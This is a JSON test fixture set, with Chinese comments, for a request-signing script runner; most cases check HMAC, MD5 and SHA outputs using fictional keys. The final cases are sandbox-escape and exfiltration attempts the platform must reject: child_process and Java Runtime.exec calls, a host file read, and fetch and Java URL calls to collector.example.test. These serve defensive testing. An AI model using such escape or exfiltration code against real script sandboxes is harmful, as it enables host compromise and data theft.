@@ -1,0 +1,435 @@
+{
+  "fixtureSet": "signature-script-execution",
+  "note": "TEST-ONLY：不得用于真实认证。纯虚构离线测试数据：凭据一律 FICTIONAL_* 命名，URL 仅 example.test（唯一例外为 Postman v2.1 schema 规范标识字符串，属格式常量）。本文件为验收基准，不描述任何实现现状，也不构成对实现的支持声明。 成功用例的预期值由 Python 标准库 hashlib/hmac/base64 独立计算。",
+  "semantics": {
+    "expectedOutcome": {
+      "success": "脚本执行成功，expectedOutputs 为变量最终值",
+      "script-error": "脚本自身错误（语法/主动抛出），平台应报告并阻止发送",
+      "rejected": "平台策略或资源限制拒绝执行；不得静默忽略后继续"
+    },
+    "expectedOutputs": {
+      "successCase": "键为变量名；globals 变量以 globals. 前缀；resolvedHeaders 为头引用解析后的预期值",
+      "failureCase": "errorKind / mustNotProceed / detail"
+    },
+    "fixedTestTime": "1750000000"
+  },
+  "cases": [
+    {
+      "name": "hmac-sha256-hex-utf8-cn",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst sign = CryptoJS.HmacSHA256(body, key).toString(CryptoJS.enc.Hex);\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-001"
+      },
+      "body": "{\"msg\":\"夜测签名用例，中文正文\",\"user\":\"FICTIONAL_USER_001\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "17295664a836658af5c2ff4a3b7414ec8654ada09400c69df62dd625c9aa6ae9"
+      }
+    },
+    {
+      "name": "hmac-sha256-base64-ascii",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst sign = CryptoJS.HmacSHA256(body, key).toString(CryptoJS.enc.Base64);\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-002"
+      },
+      "body": "{\"msg\":\"ascii body\",\"n\":42}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "qFo6njjYrXtF/OALo3IiC1JWPMDudBEDaBBe8HK94Sc="
+      }
+    },
+    {
+      "name": "hmac-sha1-hex-utf8-cn",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst sign = CryptoJS.HmacSHA1(body, key).toString(CryptoJS.enc.Hex);\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-003"
+      },
+      "body": "{\"msg\":\"中文签名样例\",\"order\":\"FICTIONAL_ORDER_003\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "0e2cfba35142a2c57bf0220512f38b05c426f5fc"
+      }
+    },
+    {
+      "name": "hmac-sha1-base64",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst sign = CryptoJS.HmacSHA1(body, key).toString(CryptoJS.enc.Base64);\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-004"
+      },
+      "body": "{\"msg\":\"base64 用例\",\"seq\":4}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "f9kdzj6xv1y+0brG43fj4curIbw="
+      }
+    },
+    {
+      "name": "md5-hex-utf8-cn",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst digest = CryptoJS.MD5(body).toString(); // 默认 hex\npm.environment.set('FICTIONAL_SIGN', digest);",
+      "environment": {},
+      "body": "{\"msg\":\"MD5 摘要用例，中文\",\"seq\":5}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "5b40177946a37f84e498541a5c2382cf"
+      }
+    },
+    {
+      "name": "md5-base64",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst digest = CryptoJS.MD5(body).toString(CryptoJS.enc.Base64);\npm.environment.set('FICTIONAL_SIGN', digest);",
+      "environment": {},
+      "body": "{\"msg\":\"MD5 Base64 用例\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "1f3y1GvdZGOHxybBtSTHnA=="
+      }
+    },
+    {
+      "name": "sha256-hex-utf8-cn",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst digest = CryptoJS.SHA256(body).toString();\npm.environment.set('FICTIONAL_SIGN', digest);",
+      "environment": {},
+      "body": "{\"msg\":\"SHA256 摘要用例，中文\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "952c9ea25bfa099e353e3d0075bc6e55989f16c1341353ca9ddf413c82c5c355"
+      }
+    },
+    {
+      "name": "sha256-base64",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst digest = CryptoJS.SHA256(body).toString(CryptoJS.enc.Base64);\npm.environment.set('FICTIONAL_SIGN', digest);",
+      "environment": {},
+      "body": "{\"msg\":\"SHA256 Base64 用例\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "CVfwnlR0jw9wa0RAEAhap4OICE51KzoferB2BG0223A="
+      }
+    },
+    {
+      "name": "hmac-sha256-newline-body",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst sign = CryptoJS.HmacSHA256(body, key).toString(CryptoJS.enc.Hex);\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-009"
+      },
+      "body": "line-1: FICTIONAL\nline-2: 第二行中文\nline-3: end",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "58bee77018d31d8139bb985ea6231726c0de6e131de0ff974e71017bf447943f"
+      }
+    },
+    {
+      "name": "hmac-sha256-escaped-body",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst sign = CryptoJS.HmacSHA256(body, key).toString(CryptoJS.enc.Hex);\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-010"
+      },
+      "body": "{\"path\":\"C:\\fictional\\dir\",\"quote\":\"say \\\"hi\\\"\",\"tab\":\"col1\\tcol2\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "86dcf02f0a855ffe5e51477fa92db818892b61d45f7dc398b4812493735d1b9d"
+      }
+    },
+    {
+      "name": "hmac-sha256-38digit-body",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = pm.request.body.raw;\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst sign = CryptoJS.HmacSHA256(body, key).toString(CryptoJS.enc.Hex);\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-011"
+      },
+      "body": "{\"bigId\": 12345678901234567890123456789012345678,\"tag\":\"38位原文\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "ec66f91506d4d37385bd683d08c9c9d0afa7ee897b04e9c520f3ff513b48111f"
+      }
+    },
+    {
+      "name": "sha256-empty-body",
+      "script": "const CryptoJS = require('crypto-js');\nconst body = '';\nconst digest = CryptoJS.SHA256(body).toString();\npm.environment.set('FICTIONAL_SIGN', digest);",
+      "environment": {},
+      "body": "",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      }
+    },
+    {
+      "name": "timestamp-fixed-time-hmac",
+      "script": "// 固定测试时间：FICTIONAL_TS_FIXED 由测试环境给定，脚本不得调用真实时钟\nconst CryptoJS = require('crypto-js');\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst ts = pm.environment.get('FICTIONAL_TS_FIXED');\nconst raw = pm.request.body.raw + '&ts=' + ts;\nconst sign = CryptoJS.HmacSHA256(raw, key).toString(); // 默认 hex\npm.environment.set('FICTIONAL_SIGN', sign);\npm.environment.set('FICTIONAL_TS_USED', ts);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-013",
+        "FICTIONAL_TS_FIXED": "1750000000"
+      },
+      "body": "{\"order\":\"FICTIONAL_ORDER_013\",\"amount\":88}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}",
+        "X-Ts": "{{FICTIONAL_TS_USED}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "8aaa8c2353e169e524557f11823fb4c68e5d6ab7af5e848fb46fcd43e3e9c1d2",
+        "FICTIONAL_TS_USED": "1750000000"
+      }
+    },
+    {
+      "name": "pm-environment-set-sign",
+      "script": "const CryptoJS = require('crypto-js');\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst ts = pm.environment.get('FICTIONAL_TS_FIXED');\nconst sign = CryptoJS.HmacSHA256(pm.request.body.raw + ts, key).toString(CryptoJS.enc.Hex);\npm.environment.set('FICTIONAL_SIGN', sign);\npm.environment.set('FICTIONAL_TS_USED', ts);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-014",
+        "FICTIONAL_TS_FIXED": "1750000000"
+      },
+      "body": "{\"order\":\"FICTIONAL_ORDER_014\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "529f752daa4a6d9f92aa990a204fa6c62fee6a01a2959cf25c37723134d7a2ca",
+        "FICTIONAL_TS_USED": "1750000000"
+      }
+    },
+    {
+      "name": "pm-globals-set-nonce-header-ref",
+      "script": "const CryptoJS = require('crypto-js');\nconst nonce = pm.environment.get('FICTIONAL_NONCE');\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst sig = CryptoJS.HmacSHA256(nonce, key).toString(CryptoJS.enc.Base64);\npm.globals.set('sign', sig);\npm.globals.set('nonce', nonce);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-015",
+        "FICTIONAL_NONCE": "fictl-nonce-0001",
+        "FICTIONAL_TS_FIXED": "1750000000"
+      },
+      "body": "{\"note\":\"globals 用例\"}",
+      "headers": {
+        "X-Sign": "{{sign}}",
+        "X-Nonce": "{{nonce}}",
+        "X-Ts": "{{FICTIONAL_TS_FIXED}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "globals.sign": "BDehx2Q8vGfn2x/waNS4HgyJJVYi/lVrZ/oumyxlJYQ=",
+        "globals.nonce": "fictl-nonce-0001",
+        "resolvedHeaders": {
+          "X-Sign": "BDehx2Q8vGfn2x/waNS4HgyJJVYi/lVrZ/oumyxlJYQ=",
+          "X-Nonce": "fictl-nonce-0001",
+          "X-Ts": "1750000000"
+        }
+      }
+    },
+    {
+      "name": "pm-variables-replaceIn-prefix",
+      "script": "const CryptoJS = require('crypto-js');\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst payload = pm.variables.replaceIn('{{FICTIONAL_PREFIX}}:{{FICTIONAL_TS_FIXED}}:{{FICTIONAL_USER}}');\nconst sign = CryptoJS.HmacSHA256(payload, key).toString(CryptoJS.enc.Hex);\npm.environment.set('FICTIONAL_SIGN', sign);\npm.environment.set('FICTIONAL_PAYLOAD', payload);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-016",
+        "FICTIONAL_PREFIX": "fictl-api",
+        "FICTIONAL_TS_FIXED": "1750000000",
+        "FICTIONAL_USER": "test-user-alpha"
+      },
+      "body": "",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "c0942500ce2bf060d991b00a8cd94d850e8fa7ea639225223facae6263fd17bc",
+        "FICTIONAL_PAYLOAD": "fictl-api:1750000000:test-user-alpha"
+      }
+    },
+    {
+      "name": "environment-get-with-fallback",
+      "script": "const CryptoJS = require('crypto-js');\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nconst missing = pm.environment.get('FICTIONAL_NOT_SET') || 'fallback';\nconst digest = CryptoJS.MD5(key + missing).toString();\npm.environment.set('FICTIONAL_SIGN', digest);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-017"
+      },
+      "body": "{\"msg\":\"fallback 用例\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "success",
+      "expectedOutputs": {
+        "FICTIONAL_SIGN": "afaf621ced28f500393275cd3b0fb513"
+      }
+    },
+    {
+      "name": "missing-var-guarded-throw",
+      "script": "const CryptoJS = require('crypto-js');\nconst key = pm.environment.get('FICTIONAL_SECRET_KEY');\nif (typeof key === 'undefined') {\n  throw new Error('FICTIONAL_SECRET_KEY is not configured');\n}\nconst sign = CryptoJS.HmacSHA256(pm.request.body.raw, key).toString();\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {},
+      "body": "{\"msg\":\"guarded\"}",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "script-error",
+      "expectedOutputs": {
+        "errorKind": "missing-variable",
+        "mustNotProceed": true,
+        "detail": "环境缺少 FICTIONAL_SECRET_KEY；脚本主动抛出后，平台应报告明确错误并阻止发送请求"
+      }
+    },
+    {
+      "name": "missing-var-silent-passthrough",
+      "script": "const CryptoJS = require('crypto-js');\nconst key = pm.environment.get('FICTIONAL_UNSET_KEY');\n// 未做缺值检查：key 此时为 undefined\nconst sign = CryptoJS.HmacSHA256('static-body', key).toString();\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {},
+      "body": "static-body",
+      "headers": {
+        "X-Sign": "{{FICTIONAL_SIGN}}"
+      },
+      "expectedOutcome": "rejected",
+      "expectedOutputs": {
+        "errorKind": "unresolved-variable",
+        "mustNotProceed": true,
+        "detail": "缺值不得静默用 undefined 参与签名；严格模式应在执行中或执行前明确拒绝，而不是产出可疑签名继续发送"
+      }
+    },
+    {
+      "name": "syntax-error-script",
+      "script": "const CryptoJS = require('crypto-js');\nfunction computeSign( {\n  const sign = CryptoJS.HmacSHA256('body', 'k').toString();\n  return sign;\n}",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-020"
+      },
+      "body": "",
+      "headers": {},
+      "expectedOutcome": "script-error",
+      "expectedOutputs": {
+        "errorKind": "syntax-error",
+        "mustNotProceed": true,
+        "detail": "解析阶段即失败；不得执行任何语句、不得发送请求"
+      }
+    },
+    {
+      "name": "unknown-require-lodash",
+      "script": "const _ = require('lodash');\nconst CryptoJS = require('crypto-js');\nconst payload = _.trim('  FICTIONAL_PAYLOAD_VALUE  ');\nconst sign = CryptoJS.HmacSHA256(payload, pm.environment.get('FICTIONAL_SECRET_KEY')).toString();\npm.environment.set('FICTIONAL_SIGN', sign);",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-021"
+      },
+      "body": "",
+      "headers": {},
+      "expectedOutcome": "rejected",
+      "expectedOutputs": {
+        "errorKind": "unsupported-module",
+        "mustNotProceed": true,
+        "detail": "lodash 不在支持模块清单；必须显式报错，不得静默返回 undefined 后继续执行"
+      }
+    },
+    {
+      "name": "require-child-process",
+      "script": "const cp = require('child_process');\nconst out = cp.execSync('echo FICTIONAL_HOST_PROBE').toString();\npm.environment.set('FICTIONAL_PROBE', out);",
+      "environment": {},
+      "body": "",
+      "headers": {},
+      "expectedOutcome": "rejected",
+      "expectedOutputs": {
+        "errorKind": "host-access",
+        "mustNotProceed": true,
+        "detail": "child_process 属宿主访问能力；必须在 require 或调用阶段拒绝"
+      }
+    },
+    {
+      "name": "infinite-loop-guard",
+      "script": "const CryptoJS = require('crypto-js');\nlet counter = 0;\nwhile (true) {\n  counter += 1; // 故意无限循环：验证执行时限与取消\n}",
+      "environment": {
+        "FICTIONAL_SECRET_KEY": "fictl-secret-key-023"
+      },
+      "body": "",
+      "headers": {},
+      "expectedOutcome": "rejected",
+      "expectedOutputs": {
+        "errorKind": "execution-timeout",
+        "mustNotProceed": true,
+        "detail": "执行超过时限必须被终止并回报；资源回收，不得阻塞后续请求"
+      }
+    },
+    {
+      "name": "output-flood",
+      "script": "let parts = [];\nfor (let i = 0; i < 200000; i += 1) {\n  parts.push('FICTIONAL_FLOOD_' + i);\n}\nconsole.log(parts.join(','));",
+      "environment": {},
+      "body": "",
+      "headers": {},
+      "expectedOutcome": "rejected",
+      "expectedOutputs": {
+        "errorKind": "output-limit",
+        "mustNotProceed": true,
+        "detail": "输出超限必须截断或中止并报告；不得无界占用内存或日志"
+      }
+    },
+    {
+      "name": "java-host-runtime-escape",
+      "script": "const Runtime = Java.type('java.lang.Runtime').getRuntime();\nconst proc = Runtime.exec('echo FICTIONAL_ESCAPE');\npm.environment.set('FICTIONAL_ESCAPE_OUT', 'attempted');",
+      "environment": {},
+      "body": "",
+      "headers": {},
+      "expectedOutcome": "rejected",
+      "expectedOutputs": {
+        "errorKind": "host-access",
+        "mustNotProceed": true,
+        "detail": "Java 宿主对象访问必须拒绝；不得执行系统命令"
+      }
+    },
+    {
+      "name": "java-host-file-read",
+      "script": "const Files = Java.type('java.nio.file.Files');\nconst Paths = Java.type('java.nio.file.Paths');\nconst bytes = Files.readAllBytes(Paths.get('/fictional/secret-notes.txt'));\npm.environment.set('FICTIONAL_LEAK_LEN', String(bytes.length));",
+      "environment": {},
+      "body": "",
+      "headers": {},
+      "expectedOutcome": "rejected",
+      "expectedOutputs": {
+        "errorKind": "host-access",
+        "mustNotProceed": true,
+        "detail": "文件系统访问必须拒绝；不得读取宿主文件"
+      }
+    },
+    {
+      "name": "network-fetch-reject",
+      "script": "fetch('https://collector.example.test/collect', { method: 'POST', body: 'FICTIONAL_EXFIL' });\npm.environment.set('FICTIONAL_NETWORK', 'attempted');",
+      "environment": {},
+      "body": "",
+      "headers": {},
+      "expectedOutcome": "rejected",
+      "expectedOutputs": {
+        "errorKind": "network-access",
+        "mustNotProceed": true,
+        "detail": "网络请求必须拒绝；若宿主未提供 fetch 则为 ReferenceError，两种情形都需要可诊断错误"
+      }
+    },
+    {
+      "name": "network-java-url-reject",
+      "script": "const URL = Java.type('java.net.URL');\nconst conn = new URL('https://collector.example.test/beacon').openConnection();\nconn.connect();\npm.environment.set('FICTIONAL_NETWORK', 'attempted');",
+      "environment": {},
+      "body": "",
+      "headers": {},
+      "expectedOutcome": "rejected",
+      "expectedOutputs": {
+        "errorKind": "network-access",
+        "mustNotProceed": true,
+        "detail": "通过 Java 宿主的网络访问必须拒绝"
+      }
+    }
+  ]
+}
